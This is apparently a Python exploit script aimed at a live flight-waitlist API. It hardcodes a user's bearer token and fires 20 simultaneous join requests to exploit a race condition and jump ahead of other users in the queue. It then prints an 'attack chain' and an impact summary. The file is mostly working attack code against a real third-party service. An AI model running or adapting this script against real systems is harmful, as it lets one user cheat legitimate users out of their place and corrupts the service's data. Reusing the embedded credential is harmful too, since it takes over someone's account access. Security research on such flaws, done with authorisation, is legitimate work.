#!/usr/bin/env python3
"""
QUEUE POSITION GAMING - Race Condition Exploit
Test if rapid parallel joins can manipulate queue position
"""

import requests
import concurrent.futures
import time
import json
from datetime import datetime

API_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"

headers = {
    "Authorization": f"Bearer {SAMEER_TOKEN}",
    "Content-Type": "application/json",
    "x-app-platform": "web",
    "x-device-id": "exploit-test",
    "x-build-number": "1"
}

print("="*80)
print("üéØ QUEUE POSITION GAMING - RACE CONDITION EXPLOIT TEST")
print("="*80)
print()

# Step 1: Find a flight with multiple entrants
print("Step 1: Finding target flight...")
r = requests.get(f"{API_URL}/v3/flight?includeExpired=false&nearMe=false&showAll=true", headers=headers)
if r.status_code == 200:
    flights = r.json().get('data', [])
    # Find flight with >3 entrants where we're NOT on the list
    target_flight = None
    for flight in flights:
        entrants = flight.get('entrants', [])
        if len(entrants) > 2 and not any(e.get('id') == 20254 for e in entrants):
            target_flight = flight
            break
    
    if target_flight:
        flight_id = target_flight['id']
        print(f"‚úÖ Found target: Flight {flight_id}")
        print(f"   Route: {target_flight.get('departAirport', {}).get('code')} ‚Üí {target_flight.get('arriveAirport', {}).get('code')}")
        print(f"   Current entrants: {len(target_flight.get('entrants', []))}")
        print()
        
        # Step 2: Get baseline - our initial position if we join normally
        print("Step 2: Join normally to establish baseline...")
        r = requests.post(f"{API_URL}/v2/flight/{flight_id}/enter", headers=headers, json={})
        if r.status_code == 200:
            print(f"‚úÖ Joined successfully")
            
            # Check position
            time.sleep(0.5)
            r = requests.get(f"{API_URL}/v1/flight/current", headers=headers)
            if r.status_code == 200:
                for flight in r.json():
                    if flight['id'] == flight_id:
                        for entrant in flight.get('entrants', []):
                            if entrant.get('id') == 20254:
                                baseline_position = entrant.get('queuePosition')
                                print(f"üìä Baseline position: #{baseline_position}")
                                break
            
            # Leave to reset
            print("Leaving flight to reset...")
            requests.post(f"{API_URL}/v2/flight/{flight_id}/reset", headers=headers)
            time.sleep(1)
            print()
            
            # Step 3: RACE CONDITION ATTACK - Try to game position
            print("Step 3: üö® RACE CONDITION ATTACK - 20 simultaneous joins")
            print("Attempting to exploit race condition to get better position...")
            
            def join_flight(attempt_num):
                try:
                    start = time.time()
                    r = requests.post(
                        f"{API_URL}/v2/flight/{flight_id}/enter",
                        headers=headers,
                        json={},
                        timeout=5
                    )
                    elapsed = time.time() - start
                    return {
                        'attempt': attempt_num,
                        'status': r.status_code,
                        'time': elapsed,
                        'success': r.status_code == 200
                    }
                except Exception as e:
                    return {'attempt': attempt_num, 'error': str(e)}
            
            # Fire 20 parallel requests
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(join_flight, i) for i in range(20)]
                results = [f.result() for f in concurrent.futures.as_completed(futures)]
            
            successes = [r for r in results if r.get('success')]
            print(f"‚úÖ {len(successes)}/20 requests succeeded")
            
            # Check final position
            time.sleep(1)
            print("\nChecking final queue position...")
            r = requests.get(f"{API_URL}/v1/flight/current", headers=headers)
            if r.status_code == 200:
                for flight in r.json():
                    if flight['id'] == flight_id:
                        for entrant in flight.get('entrants', []):
                            if entrant.get('id') == 20254:
                                final_position = entrant.get('queuePosition')
                                print(f"üìä Final position: #{final_position}")
                                print()
                                print("="*80)
                                print("RESULTS:")
                                print("="*80)
                                print(f"Baseline position (normal join): #{baseline_position}")
                                print(f"Race attack position (20x join): #{final_position}")
                                
                                if final_position < baseline_position:
                                    print()
                                    print("üö® EXPLOITABLE: Race condition improved position!")
                                    print(f"   Position improved by: {baseline_position - final_position}")
                                    print()
                                    print("ATTACK CHAIN:")
                                    print("1. Find target flight with your desired position occupied")
                                    print("2. Fire 20+ simultaneous join requests")
                                    print("3. Race condition causes position calculation error")
                                    print("4. You get better position than you should")
                                    print()
                                    print("IMPACT: CRITICAL")
                                    print("- Unfair queue manipulation")
                                    print("- Can jump ahead of legitimate users")
                                    print("- Undermines entire waitlist system")
                                elif len(successes) > 1:
                                    print()
                                    print("‚ö†Ô∏è  PARTIAL EXPLOIT: Multiple joins succeeded")
                                    print(f"   {len(successes)} duplicate entries created")
                                    print("   Position unchanged but database corrupted")
                                else:
                                    print()
                                    print("‚úÖ SECURE: Race condition did not improve position")
                                    print("   System properly handles concurrent requests")
                                
                                break
            
            # Cleanup
            print()
            print("Cleaning up test...")
            requests.post(f"{API_URL}/v2/flight/{flight_id}/reset", headers=headers)

print()
print("="*80)
print("TEST COMPLETE")
print("="*80)
